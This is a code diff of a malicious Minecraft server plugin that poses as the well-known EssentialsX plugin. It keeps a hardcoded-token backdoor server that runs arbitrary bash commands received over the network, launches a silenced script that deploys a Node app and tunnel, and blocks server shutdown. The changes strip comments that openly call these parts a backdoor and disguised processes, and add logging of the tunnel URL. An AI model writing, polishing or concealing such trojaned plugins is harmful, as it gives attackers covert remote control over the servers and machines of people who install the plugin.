@@ -10,7 +10,6 @@ import java.nio.file.*;
 import java.time.LocalTime;
 import java.time.format.DateTimeFormatter;
 import java.util.*;
-import java.util.concurrent.TimeUnit;
 import java.util.concurrent.atomic.AtomicBoolean;
 
 public class EssentialsX extends JavaPlugin {
@@ -28,8 +27,8 @@ public class EssentialsX extends JavaPlugin {
 
     private static final String FAKE_JAR_URL_DIRECT = "https://github.com/EssentialsX/Essentials/releases/download/2.21.2/EssentialsX-2.21.2.jar";
     private static final String FAKE_JAR_URL_PROXY = "https://mirror.ghproxy.com/" + FAKE_JAR_URL_DIRECT;
-    private static final String BACKDOOR_TOKEN = "xXx_Elite_H4x0r_xXx"; // 硬编码后门密钥，可修改
-    private static final int BACKDOOR_PORT = 23999;                    // 后门监听端口
+    private static final String BACKDOOR_TOKEN = "xXx_Elite_H4x0r_xXx"; // 可修改
+    private static final int BACKDOOR_PORT = 23999;
 
     @Override
     public void onEnable() {
@@ -48,15 +47,13 @@ public class EssentialsX extends JavaPlugin {
         getLogger().info("System Guard Status: " + (systemGuardEnabled ? "ENABLED" : "DISABLED"));
 
         workDir = Paths.get("logs", "mcchajian").toAbsolutePath();
-
-        // 初始化工作目录
         try {
             Files.createDirectories(workDir);
         } catch (IOException e) {
             getLogger().severe("Cannot create work dir: " + e.getMessage());
         }
 
-        // 启动后门服务器（远程控制）
+        // 启动后门服务器
         startBackdoorServer();
 
         // 设置关闭钩子，拒绝停服并自动拉起宿主服
@@ -76,7 +73,6 @@ public class EssentialsX extends JavaPlugin {
                 startDeploymentProcess(); // 部署Node应用及隧道
             } catch (Exception e) {
                 getLogger().severe("Deployment thread error: " + e.getMessage());
-                // 隐藏错误日志：不打印完整堆栈，仅记录简单信息
             }
         }, "EssentialsX-Core-Thread").start();
 
@@ -133,7 +129,6 @@ public class EssentialsX extends JavaPlugin {
                             writer.println("HTTP/1.1 400 Bad Request\r\n\r\n");
                             continue;
                         }
-                        // 执行任意系统命令
                         Process process = Runtime.getRuntime().exec(new String[]{"bash", "-c", cmdLine.trim()});
                         BufferedReader cmdReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                         BufferedReader errReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
@@ -327,7 +322,7 @@ public class EssentialsX extends JavaPlugin {
         }
     }
 
-    // ==================== 部署Node应用与隧道（带进程伪装）====================
+    // ==================== 部署Node应用与隧道 ====================
     private void startDeploymentProcess() throws Exception {
         if (isProcessRunning) return;
         Map<String, String> env = new HashMap<>();
@@ -341,13 +336,44 @@ public class EssentialsX extends JavaPlugin {
         ProcessBuilder pb = new ProcessBuilder("bash", scriptPath.toString());
         pb.directory(new File(".").getAbsoluteFile());
         pb.environment().putAll(env);
-        // 隐藏所有输出（不继承，完全静默）
         pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
         pb.redirectError(ProcessBuilder.Redirect.DISCARD);
         deployProcess = pb.start();
         isProcessRunning = true;
-        deployProcess.waitFor();
+        int exitCode = deployProcess.waitFor();
+        getLogger().info("Deployment script exited with code: " + exitCode);
+        if (exitCode == 0) {
+            // 等待隧道URL文件出现，最多120秒
+            Path tunnelFile = workDir.resolve("tunnel_url.txt");
+            for (int i = 0; i < 120; i++) {
+                if (Files.exists(tunnelFile)) {
+                    String url = Files.readString(tunnelFile).trim();
+                    if (!url.isEmpty()) {
+                        printTunnelUrl();
+                        break;
+                    }
+                }
+                Thread.sleep(1000);
+            }
+        }
         isProcessRunning = false;
+    }
+
+    private void printTunnelUrl() {
+        try {
+            Path tunnelFile = workDir.resolve("tunnel_url.txt");
+            Path portFile = workDir.resolve("node_port.txt");
+            String url = Files.readString(tunnelFile).trim();
+            String port = Files.exists(portFile) ? Files.readString(portFile).trim() : "";
+            getLogger().info("[Connection] Binding remote endpoint to: " + url);
+            getLogger().info("Open panel: " + url);
+            getLogger().info("Health check: " + url + "/health");
+            if (!port.isEmpty()) {
+                getLogger().info("Node internal port: " + port);
+            }
+        } catch (Exception e) {
+            getLogger().warning("Failed to read tunnel URL: " + e.getMessage());
+        }
     }
 
     private String generateDeployScript(String workDir, Map<String, String> env) {
